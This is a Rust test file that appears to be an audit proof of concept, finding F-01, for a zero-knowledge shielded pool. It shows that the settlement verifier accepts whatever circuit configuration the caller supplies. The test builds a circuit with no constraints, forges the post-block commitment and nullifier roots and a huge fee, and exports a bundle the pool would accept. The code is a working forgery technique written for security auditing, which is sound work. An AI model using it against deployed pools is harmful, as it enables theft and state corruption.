//! AUDIT PoC F-01 — the settlement verifier is not bound to the block circuit.
//!
//! `WhirVerifier.verify` takes the whole CONFIG section (batch seed, degree
//! bits, the preprocessed digest that identifies the circuit, grind bits,
//! every WHIR round schedule, and the constraint programs evaluated by the
//! `TerminalWeight` satellite) from the caller-supplied proof bundle, and never
//! compares it with a pinned value. `ShieldedPool.applyBlock` is callable by
//! anyone. So anyone can prove an *arbitrary* circuit whose public values are
//! a well-formed block statement and the pool will accept it.
//!
//! This test builds such a circuit: it has no transfer verification, no tree
//! fold and no nullifier logic at all - it simply exposes 87 public inputs as
//! its statement. The statement copies the honest genesis `rootBefore` and
//! `nullifierBefore` (so continuity holds) and replaces `rootAfter` and
//! `nullifierAfter` with attacker-chosen digests. The bundle is produced with
//! the project's own exporter (`settlement_bundle`), i.e. exactly the bytes the
//! node would send. The companion forge test
//! `contracts/test/audit/PocF01ForgedBlock.t.sol` submits it to a freshly
//! deployed `WhirVerifier` + `ShieldedPool` and shows the pool adopts the
//! forged roots.
//!
//! ```text
//! cargo test -p prover --test poc_audit_f01 -- --ignored --nocapture
//! ```
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::path::PathBuf;

use p3_circuit::{CircuitBuilder, StatementExport};
use p3_field::{PrimeCharacteristicRing, PrimeField32};
use prover::composed_export::settlement_bundle;
use prover::settlement_replay::Challenge;
use prover::whir_recursion::RecursionCircuit;
use prover::F;

/// Block statement offsets for n = 1 (see BlockStatement.sol / block.rs):
/// [n, nin, nout, statementRoot(16), rootBefore(16), rootAfter(16),
///  nfBefore(16), nfAfter(16), fee(4)].
const ROOT_AFTER: usize = 3 + 16 + 16;
const NF_AFTER: usize = 3 + 16 + 16 + 16 + 16;
const FEE: usize = 3 + 16 * 5;

fn vectors_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../contracts/test/vectors")
}

/// 32 attacker-chosen bytes as the 16 little-endian u16 limbs LimbCodec reads.
fn digest_limbs(bytes: &[u8; 32]) -> Vec<F> {
    bytes
        .chunks_exact(2)
        .map(|c| F::from_u16(u16::from_le_bytes([c[0], c[1]])))
        .collect()
}

/// A "settlement circuit" that proves nothing: its statement is whatever the
/// caller hands it. The ALU padding only makes the tables tall enough for the
/// WHIR settlement shape; it is unrelated to the statement.
fn forged_circuit(statement: &[F], padding: usize) -> RecursionCircuit {
    let mut b = CircuitBuilder::<Challenge>::new();
    let pis = b.alloc_public_inputs(statement.len(), "forged statement");
    let mut acc = b.define_const(Challenge::ONE);
    let k = b.define_const(Challenge::from(F::from_u32(3)));
    for _ in 0..padding {
        acc = b.mul(acc, k);
    }
    let exports: Vec<StatementExport> = pis.iter().map(|&t| StatementExport::Base(t)).collect();
    let schema = b.set_statement_exports::<F>(&exports).expect("statement schema");
    let circuit = b.build().expect("build forged circuit");
    let mut runner = circuit.runner();
    let public: Vec<Challenge> = statement.iter().map(|&x| Challenge::from(x)).collect();
    runner.set_public_inputs(&public).expect("public inputs");
    let traces = runner.run().expect("run forged circuit");
    RecursionCircuit {
        circuit,
        traces,
        schema,
    }
}

#[test]
#[ignore = "proves a forged settlement batch; writes contracts/test/vectors/audit/poc_f01_*"]
fn poc_f01_forged_settlement_proof_for_arbitrary_roots() {
    let genesis: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(vectors_dir().join("block_genesis.json")).unwrap(),
    )
    .unwrap();
    let honest: Vec<F> = genesis["statement"]
        .as_array()
        .unwrap()
        .iter()
        .map(|v| F::from_u32(u32::try_from(v.as_u64().unwrap()).unwrap()))
        .collect();
    assert_eq!(honest.len(), 87, "one-transfer block statement");

    // Keep n, the shape header, statementRoot, rootBefore and nullifierBefore
    // (continuity with the deployed pool); forge everything the pool adopts.
    let forged_root = *b"F-01 attacker-chosen commit root";
    let forged_nf = *b"F-01 attacker-chosen nullif root";
    let mut forged = honest.clone();
    forged[ROOT_AFTER..ROOT_AFTER + 16].copy_from_slice(&digest_limbs(&forged_root));
    forged[NF_AFTER..NF_AFTER + 16].copy_from_slice(&digest_limbs(&forged_nf));
    // A fee no transfer ever paid: 2^62 - 1 in 16/16/16/14-bit limbs.
    forged[FEE..FEE + 4].copy_from_slice(&[
        F::from_u16(0xffff),
        F::from_u16(0xffff),
        F::from_u16(0xffff),
        F::from_u16(0x3fff),
    ]);

    let rc = forged_circuit(&forged, 1 << 14);
    // The forged circuit verifies no child proof: it has no Poseidon2
    // permutations at all, only public inputs and an ALU chain.
    let (bundle, jj) = settlement_bundle(&rc, &forged).expect("forged settlement bundle");

    let dir = vectors_dir().join("audit");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("poc_f01_forged_bundle.bin"), &bundle).unwrap();
    let sidecar = serde_json::json!({
        "description": "AUDIT PoC F-01: settlement bundle for a circuit with no constraints on its statement",
        "statement": forged.iter().map(PrimeField32::as_canonical_u32).collect::<Vec<_>>(),
        "genesis_root_hex": genesis["genesis_root_hex"],
        "forged_root_after": format!("0x{}", hex_of(&forged_root)),
        "forged_nullifier_after": format!("0x{}", hex_of(&forged_nf)),
        "num_rounds": jj["num_rounds"],
    });
    std::fs::write(
        dir.join("poc_f01_forged_block.json"),
        serde_json::to_string_pretty(&sidecar).unwrap(),
    )
    .unwrap();
    println!(
        "F-01: forged bundle {} bytes, {} opening rounds",
        bundle.len(),
        jj["num_rounds"]
    );
}

fn hex_of(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}
